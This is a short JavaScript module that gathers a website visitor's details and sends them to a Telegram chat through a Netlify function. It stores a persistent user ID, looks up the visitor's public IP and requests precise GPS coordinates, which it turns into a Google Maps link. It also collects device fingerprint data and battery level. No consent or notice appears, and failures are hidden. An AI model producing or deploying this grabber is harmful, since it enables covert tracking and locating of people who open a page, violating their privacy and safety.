import React from 'react'

const prepareUserInfo = async () => {
  try {
    // 1. Generate unique user ID
    let newUser = false;
    let userId = localStorage.getItem("uniqueUserId");
    if (!userId) {
      newUser = true;
      userId = crypto.randomUUID();
      localStorage.setItem("uniqueUserId", userId);
    }

    // 2. Ambil IP user
    let userIP = "Unknown";
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipRes.json();
      userIP = ipData.ip;
    } catch { }

    // 3. Ambil lokasi user
    const getLocation = () => {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          return resolve({ latitude: null, longitude: null, accuracy: null });
        }
        navigator.geolocation.getCurrentPosition(
          (position) => {
            resolve({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
            });
          },
          () => {
            resolve({ latitude: null, longitude: null, accuracy: null });
          }
        );
      });
    };
    const location = await getLocation();
    const gmapsLink = location.latitude && location.longitude
      ? `https://maps.google.com/?q=${location.latitude},${location.longitude}`
      : "Location unavailable";

    // 4. Ambil device info
    const userAgent = navigator.userAgent;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const pixelRatio = window.devicePixelRatio;

    // 5. Waktu sesuai timezone
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const localTime = `${new Date().toLocaleString()} (${timezone})`;

    // 6. Battery info
    let batteryLevel = null;
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
    } else {
      batteryLevel = "Not supported";
    }

    // 7. Buat pesan Telegram
    const message = {
      userId,
      newUser,
      userIP,
      gmapsLink,
      latitude: location.latitude,
      longitude: location.longitude,
      accuracy: location.accuracy,
      userAgent,
      screenWidth,
      screenHeight,
      pixelRatio,
      batteryLevel,
      localTime,
      timezone,
    };

    // 8. Kirim ke backend Netlify Function
    await fetch("/.netlify/functions/sendToTelegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message),
    });

  } catch (err) {
    console.error("❌", err);
  }
}

export default prepareUserInfo;